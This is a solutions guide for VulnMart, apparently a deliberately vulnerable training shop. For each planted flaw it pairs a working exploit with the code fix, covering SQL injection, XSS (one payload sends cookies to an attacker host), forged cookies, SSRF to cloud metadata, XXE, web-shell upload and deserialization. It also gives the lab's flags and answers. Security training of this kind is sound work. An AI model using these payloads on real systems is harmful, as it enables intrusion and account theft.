# VulnMart — Solutions Guide 🛡️

Every intentional vulnerability in VulnMart, with a working exploit and the code change that fixes
it. The same ids are used in the source (`VULNERABILITY [SQLI-1]`) and in the table in
[Readme.md](Readme.md).

The commands assume the Docker setup on <http://localhost:8080>. Start with a fresh lab:

```bash
make reset          # or open http://localhost:8080/init_db.php and press "Reset the whole lab"
```

Handy aliases used below:

```bash
APP=http://localhost:8080
JAR=/tmp/vulnmart.cookies
```

---

## 1. SQL injection (SQLI-1 … SQLI-8)

### Where

| Id | Page | Injection point |
| -- | ---- | --------------- |
| SQLI-1 | `src/index.php` | `?q=` search term |
| SQLI-2 | `src/product.php` | `?id=` product id |
| SQLI-3 | `src/login.php` | username / password |
| SQLI-4 | `src/register.php` | every registration field |
| SQLI-5 | `src/index.php` | `?category=` |
| SQLI-6 | `src/product.php` | review author / comment |
| SQLI-7 | `src/admin/users.php` | `?q=` user search |
| SQLI-8 | `src/admin/logs.php` | `?q=` log filter |

### Exploit — authentication bypass (SQLI-3)

```bash
curl -s -i -c $JAR -X POST \
  --data-urlencode "username=admin' -- " --data-urlencode "password=anything" \
  $APP/login.php | grep -i location
# Location: /
```

Any password works: the `-- ` comments out the password check.

### Exploit — dumping the users table (SQLI-1)

The catalogue query selects nine columns, so a nine column `UNION` reads straight out of `users`.
The search term sits inside a parenthesised `OR`, so the payload closes the bracket first:

```bash
curl -s "$APP/?q=%27%29%20UNION%20SELECT%201,username,password,4,5,6,7,8,9%20FROM%20users%20--%20" \
  | grep -o 'supersecretadmin123'
```

`/product.php?id=1 OR 1=1` (SQLI-2) and the admin filters (SQLI-7, SQLI-8) behave the same way.

### Impact

Full read access to the database (users, password hashes — here plain text, orders, coupons), login
bypass, and with SQLite's `ATTACH`/`load_extension` or stacked statements a path to code execution.

### Fix

Never concatenate. Use prepared statements, and cast numeric ids:

```php
// src/index.php
$stmt = $db->prepare(
    'SELECT * FROM products WHERE (name LIKE :term OR description LIKE :term) AND category = :category'
);
$stmt->execute([':term' => '%' . $search . '%', ':category' => $category]);
$products = $stmt->fetchAll();

// src/product.php
$stmt = $db->prepare('SELECT * FROM products WHERE id = ?');
$stmt->execute([(int) $_GET['id']]);
```

For the login form, bind the username, fetch one row and compare it in PHP — see
[Broken authentication](#3-broken-authentication-auth-1--auth-9).

---

## 2. Cross-site scripting (XSS-1 … XSS-5)

### Where and how to trigger

| Id | Type | Payload |
| -- | ---- | ------- |
| XSS-1 | Reflected | `$APP/?q=<script>alert(document.cookie)</script>` |
| XSS-2 | Stored (reviews) | post `<img src=x onerror=alert(document.cookie)>` as a review |
| XSS-3 | Stored (profile bio / order notes) | put `<script>fetch('//attacker/?'+document.cookie)</script>` in your bio |
| XSS-4 | Stored (log) | send a request with `-A '<script>alert(1)</script>'`, then open the admin log |
| XSS-5 | Stored (flash) | register a user named `<img src=x onerror=alert(1)>` |

```bash
# XSS-1
curl -s "$APP/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep -F '<script>alert(1)</script>'

# XSS-4 — the payload is recorded on any request, then rendered in /admin/logs.php
curl -s -A '<script>alert(1)</script>' -X POST -d "username=nobody&password=x" $APP/login.php
curl -s -H 'Cookie: role=admin' $APP/admin/logs.php | grep -F '<script>alert(1)</script>'

# XSS-2 — stored in the database and served to every visitor of the product page
curl -s -X POST --data-urlencode 'author=<img src=x onerror=alert(1)>' \
  --data-urlencode 'comment=hello' -d 'rating=5' "$APP/product.php?id=1"
```

### Impact

Because the session cookie has no `HttpOnly` flag (AUTH-3), a single stored payload can steal an
administrator's session — and the admin panel has no CSRF protection either, so a script can create
products, delete users or reset the lab while the admin is browsing.

### Fix

Escape on output, always with the right context:

```php
echo htmlspecialchars($search, ENT_QUOTES, 'UTF-8');          // HTML text and attributes
```

The helper `h()` in `src/includes/functions.php` does this already — it is simply not used for the
tainted values. Do not "fix" XSS with `strip_tags()`; encoding is what stops execution. Also add
`session.cookie_httponly=1`, a Content-Security-Policy header and a CSRF token (see CSRF below).

---

## 3. Broken authentication (AUTH-1 … AUTH-9)

### AUTH-1 — plain text passwords

`src/includes/schema.php` seeds `admin / supersecretadmin123` and the login compares strings, so one
`SELECT * FROM users` (SQLI-1) hands over every account.

```php
// seeding
$hash = password_hash($password, PASSWORD_DEFAULT);

// login
$stmt = $db->prepare('SELECT * FROM users WHERE username = ?');
$stmt->execute([$username]);
$user = $stmt->fetch();
if ($user && password_verify($password, $user['password'])) { /* success */ }
```

### AUTH-2 — forgeable remember-me cookie

The cookie is `base64("id:username")`, so it can be built offline:

```bash
COOKIE="remember_me=$(printf '1:admin' | base64)"
curl -s -H "Cookie: $COOKIE" $APP/profile.php | grep -o 'admin'
```

**Fix:** use a random selector+validator pair stored server side (hashed), or a signed token
(`hash_hmac('sha256', $value, $secret)`), rotate it on every use and expire it with the session.

### AUTH-3 — session handling

The session id is never regenerated at login and the cookie is not `HttpOnly`, which enables session
fixation:

```bash
# 1. attacker plants a session id
curl -s "$APP/login.php?PHPSESSID=attackerchosenid" -c /tmp/fix.txt
# 2. victim logs in with that id, 3. the attacker reuses it
curl -s -H 'Cookie: PHPSESSID=attackerchosenid' $APP/profile.php
```

**Fix:** `session_regenerate_id(true)` after login and on privilege change, `session.use_strict_mode=1`,
`HttpOnly` + `Secure` + `SameSite=Lax` on the cookie, and a sensible session lifetime.

### AUTH-4 — open redirect

```bash
curl -s -i -X POST -d "username=alice&password=alice123" \
  "$APP/login.php?next=https://example.com/phish" | grep -i location
```

**Fix:** only accept relative paths: `if (!str_starts_with($next, '/') || str_starts_with($next, '//')) $next = '/';`

### AUTH-5 — mass assignment

Registration accepts a `role`, so anyone can create an administrator:

```bash
curl -s -c /tmp/eve.txt -X POST -d "username=eve&email=eve@example.com&password=evepw&confirm=evepw&role=admin" \
  $APP/register.php
curl -s -b /tmp/eve.txt $APP/admin/ | grep -o 'Admin dashboard'
```

`src/seller/product_edit.php` has the same problem with `seller_id`.

**Fix:** build the insert from an explicit allow-list of fields, never from `$_POST` keys, and force
`role = 'customer'` on public registration.

### AUTH-6 — logout leaves the remember-me cookie

Sign in with *Remember me*, log out, reload: you are signed in again. Clear the cookie on logout
(`setcookie('remember_me', '', time() - 3600, '/')`) and invalidate the server side token.

### AUTH-7 — password change without the current password

`profile.php` accepts a new password with no `password_verify()` check and no re-authentication, so a
stolen session (or a CSRF request, see below) can silently take over the account.

### AUTH-8 — authorisation trusts a cookie ⚠️

This is the most damaging flaw in the lab:

```bash
curl -s -H 'Cookie: role=admin'  $APP/admin/  | grep -o 'Admin dashboard'
curl -s -H 'Cookie: role=seller' $APP/seller/ | grep -o 'Seller dashboard'
```

`is_admin()` / `is_seller()` read `$_COOKIE['role']` before the session is consulted.

**Fix:** derive the role from the session/database only (`current_user()['role']`), never from a
request value, and check it server side in a single `require_role('admin')` helper.

### AUTH-9 — no rate limiting

`login.php` answers as fast as the database allows and never locks an account, so brute force and
password spraying are trivial.

**Fix:** exponential back-off or a lockout per account and per IP, plus logging/alerting on repeated
failures (the activity log already records them).

---

## 4. Broken access control / IDOR (IDOR-1 … IDOR-5)

### Exploits

```bash
# as alice: read bob's order (FLAG{1d0r_0rd3r_d3t41l} is in its notes)
curl -s -b $JAR "$APP/order.php?id=1" | grep -o 'FLAG{[^}]*}'

# read the administrator's profile, biography included (FLAG{1d0r_pr0f1l3_r34d})
curl -s -b $JAR "$APP/profile.php?id=1" | grep -o 'FLAG{[^}]*}'

# overwrite somebody else's profile
curl -s -b $JAR -X POST -d "user_id=1&email=owned@example.com&bio=owned" "$APP/profile.php?id=1"

# cancel somebody else's order
curl -s -b $JAR -X POST -d "action=cancel&id=1" "$APP/order.php?id=1"
```

### Impact

Horizontal privilege escalation over every object in the shop: orders, profiles, products, and
vertical escalation through the admin role change (`admin/users.php`).

### Fix

Authorise every object access against the session user, in the query itself:

```php
$stmt = $db->prepare('SELECT * FROM orders WHERE id = ? AND user_id = ?');
$stmt->execute([$orderId, (int) $currentUser['id']]);
```

and gate privileged pages behind a server side role check (AUTH-8).

---

## 5. CSRF (CSRF-1 … CSRF-4)

No form in VulnMart carries or verifies a token. A page on any other origin can therefore make a
signed in visitor's browser change their email, cancel orders, empty the cart, delete users or reset
the database:

```html
<!-- hosted on an attacker's page -->
<form action="http://localhost:8080/profile.php?id=2" method="POST" id="f">
  <input name="user_id" value="2">
  <input name="email" value="attacker@example.com">
  <input name="password" value="pwned123">
</form>
<script>document.getElementById('f').submit()</script>
```

**Fix:** a per-session token in every state-changing form, verified before any write:

```php
// render
<input type="hidden" name="csrf" value="<?= h($_SESSION['csrf']) ?>">
// verify
if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
    http_response_code(419);
    exit('CSRF token mismatch');
}
```

`SameSite=Lax` cookies (already configured) help but are not a substitute.

---

## 6. SSRF and local file read (SSRF-1, SSRF-2, LFI-1)

`src/seller/image_proxy.php` fetches whatever the seller asks for, and the fetch happens on the
server, from inside the container:

```bash
# internal endpoint that is unreachable from outside (FLAG{ssrf_1nt3rn4l_r34ch})
curl -s -H 'Cookie: role=seller' -d 'url=http://127.0.0.1/internal/secret.php' $APP/seller/image_proxy.php \
  | grep -o 'FLAG{[^}]*}'

# cloud metadata (169.254.169.254) or any internal service works the same way
curl -s -H 'Cookie: role=seller' -d 'url=http://169.254.169.254/latest/meta-data/' $APP/seller/image_proxy.php

# read files with the file:// wrapper (FLAG{l0c4l_f1l3_1nclus10n})
curl -s -H 'Cookie: role=seller' -d 'url=file:///var/www/data/flag_backup.txt' $APP/seller/image_proxy.php
```

`SSRF-2` is the client side sibling: `image` is rendered as-is when it starts with `http`, so a seller
can point every visitor at a third party host (tracking, mixed content, browser side pivoting).

**Fix:** do not fetch arbitrary URLs. Allow-list the hosts the shop actually uses, resolve and pin the
IP, reject loopback/link-local/private ranges, disable the `file://` and `php://` wrappers, and stream
the response through a strict content-type and size check. Store images locally after validating them.

---

## 7. XXE (XXE-1)

`src/seller/bulk_import.php` parses the uploaded XML with entity substitution enabled and an explicit
external entity loader.

```bash
curl -s -H 'Cookie: role=seller' -X POST --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE products [ <!ENTITY xxe SYSTEM "file:///var/www/data/flag_backup.txt"> ]>
<products><product><name>&xxe;</name><price>1</price></product></products>' \
  $APP/seller/bulk_import.php | grep -o 'FLAG{[^}]*}'
```

`file:///etc/passwd`, the SQLite database and internal URLs (a blind SSRF through the entity) are all
reachable.

**Fix:**

```php
// 1. refuse document type definitions entirely — product feeds never need them
if (stripos($xml, '<!DOCTYPE') !== false) {
    throw new RuntimeException('DTDs are not allowed in import files');
}

// 2. parse without entity substitution and without network access
$document = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET);

// 3. validate the structure before writing anything to the database
```

PHP 8 with libxml ≥ 2.9 does not resolve external entities unless asked to; the lab asks explicitly
with `LIBXML_NOENT | LIBXML_DTDLOAD` and a custom entity loader. Also validate the parsed structure,
the file extension and the file size before storing uploads.

---

## 8. Unrestricted file upload (UPLOAD-1)

The bulk importer stores the uploaded file under its original name in `src/uploads/`, which Apache
serves and executes:

```bash
printf '<?php echo "pwned:" . (6*7); ?>' > /tmp/shell.php
curl -s -H 'Cookie: role=seller' -F 'file=@/tmp/shell.php' $APP/seller/bulk_import.php
curl -s $APP/uploads/shell.php     # pwned:42
```

**Fix:** generate the file name server side (`bin2hex(random_bytes(16)) . '.xml'`), store uploads
outside the document root (or add `php_flag engine off` / deny execution in that folder), validate
extension, MIME type and size, and never trust `$_FILES['name']`.

---

## 9. Insecure deserialization (DESER-1)

`UserPreferences::load()` calls `unserialize()` on the `prefs` cookie, and `Cache` in the same file
writes `$this->path` with `$this->data` from its `__destruct()`. That is a ready-made write-file
gadget — a web shell:

```bash
PAYLOAD=$(python3 - <<'PY'
import base64
shell = '<?php echo "deser:" . (6*7); ?>'
path  = '/var/www/html/uploads/deser.php'
print(base64.b64encode(
    f'O:5:"Cache":2:{{s:4:"path";s:{len(path)}:"{path}";s:4:"data";s:{len(shell)}:"{shell}";}}'.encode()
).decode())
PY
)

curl -s -H "Cookie: prefs=$PAYLOAD" $APP/ > /dev/null   # __destruct() writes the file
curl -s $APP/uploads/deser.php                          # deser:42
```

**Fix:** never `unserialize()` request data. Use `json_decode()` and rebuild the objects from
validated values. If serialisation is unavoidable, sign the payload with `hash_hmac()` and pass
`['allowed_classes' => false]` to `unserialize()`.

---

## 10. Business logic (LOGIC-1 … LOGIC-5)

### LOGIC-1 — the browser decides the price

`product.php` posts the unit price in a hidden field and `cart.php` stores it unchanged:

```bash
curl -s -b $JAR -X POST -d 'action=add&product_id=1&qty=1&price=0.01' $APP/cart.php
curl -s -b $JAR $APP/cart.php | grep -F '$0.01'
```

### LOGIC-2 + LOGIC-4 — negative quantities and negative totals

```bash
curl -s -b $JAR -X POST -d 'action=add&product_id=3&qty=-20&price=199.99' $APP/cart.php
curl -s -b $JAR -X POST -d 'action=coupon&coupon=VIP20' $APP/cart.php
curl -s -b $JAR -X POST -d 'shipping_address=1 Test Street' $APP/checkout.php -c $JAR -o /dev/null
# the checkout credits the shop's money to your balance and shows FLAG{l0g1c_fl4w_n3g4t1v3}
```

### LOGIC-3 — coupon stacking

`WELCOME10` can be applied any number of times, each time against the full subtotal, and the discount
is never capped at the order value.

### LOGIC-5 — stock handling

Stock is decremented with a blind `UPDATE products SET stock = stock - N` outside a transaction, so
two concurrent checkouts both succeed (oversell) and negative quantities restock the shop.

**Fix:** look every price up server side at checkout, require `quantity >= 1`, apply at most one
coupon per order with a cap of `min(discount, subtotal)`, refuse totals below zero, and wrap the stock
check and the decrement in a transaction with a conditional update:

```php
$db->beginTransaction();
$stmt = $db->prepare('UPDATE products SET stock = stock - ? WHERE id = ? AND stock >= ?');
$stmt->execute([$qty, $id, $qty]);
if ($stmt->rowCount() === 0) { $db->rollBack(); /* out of stock */ }
$db->commit();
```

---

## 11. Misconfiguration (MISC-1 … MISC-3)

* **MISC-1** — `display_errors=1` plus raw PDO messages. Every failed SQLi attempt prints the query,
  the table and column names, and the SQLite error, which makes exploitation much faster.
  *Fix:* `display_errors=0`, `log_errors=1`, and a generic error page.
* **MISC-2** — `/init_db.php` is public and drops every table (`POST action=reset`). *Fix:* require an
  administrator (or only ship the installer in development) and delete it from production images.
* **MISC-3** — `/info.php` prints `phpinfo()`: build, extensions, `DB_PATH`, document root, server
  paths. *Fix:* remove it, or gate it behind a local-only check.

---

## 12. Suggested hardening checklist

1. Prepared statements everywhere, numeric casts for ids.
2. Escape on output with `h()` / `htmlspecialchars()` in the right context.
3. Server side authorisation on every object (`WHERE id = ? AND user_id = ?`) and a single role gate
   that only trusts the session.
4. `password_hash()` / `password_verify()`, a password policy, rate limiting and lockouts.
5. CSRF tokens on every state-changing form; `SameSite`, `HttpOnly`, `Secure` cookies.
6. `session_regenerate_id(true)` on login; server side, expiring remember-me tokens.
7. No `unserialize()` of request data; JSON + signature when needed.
8. Price, quantity, stock and coupon rules enforced in the database transaction, never in the browser.
9. Uploads: random names, outside the web root, validated type and size, execution disabled.
10. No SSRF: allow-listed destinations, blocked private ranges, wrappers disabled.
11. XML: no DTDs, no external entities.
12. Production settings: `display_errors=0`, no `phpinfo()`, installer removed, security headers.

---

*VulnMart is deliberately vulnerable. Only run it locally, and only use these techniques on systems
you are authorised to test.*
